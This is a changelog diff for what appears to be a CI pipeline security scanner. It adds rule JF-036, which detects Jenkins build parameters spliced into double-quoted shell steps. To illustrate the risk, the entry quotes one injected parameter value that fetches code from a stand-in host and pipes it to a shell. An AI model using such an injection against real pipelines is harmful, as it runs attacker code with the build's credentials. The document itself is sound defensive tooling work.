@@ -12,6 +12,19 @@ release commit collapses this section into `## [X.Y.Z] - <date>`.
 
 ### Added
 
+- **JF-036: shell step interpolates a build parameter (`params.*`) (HIGH).**
+  Flags a `${params.X}` spliced into a double-quoted `sh` / `bat` /
+  `powershell` body. A Jenkins build parameter is set by whoever queues the
+  run (anyone with Build permission, an upstream `build job:` passing
+  `parameters:`, or a webhook trigger); a `string` parameter is free-form
+  text that Groovy substitutes into the command before the shell parses it,
+  so `params.X = "x; curl evil | sh"` runs on the agent in the build's
+  credential context. The Jenkins peer of the GHA `${{ inputs.X }}` and ADO
+  `${{ parameters.X }}` injection rules. Single-quoted Groovy bodies (which
+  don't interpolate) are not flagged. Distinct from JF-002 (SCM env vars),
+  JF-032 (agent labels), and JF-033 (`withCredentials` secret leak); the
+  shared `params.*` taint pattern is now factored into `PARAMS_TAINT_RE`.
+  jenkins 35 -> 36.
 - **BB-033: IaC apply on a pull-request pipeline (CRITICAL).** Flags a
   `terraform apply` / `cloudformation deploy` / `cdk deploy` / `pulumi up` /
   `sam deploy` in a step under Bitbucket's `pull-requests:` section, where
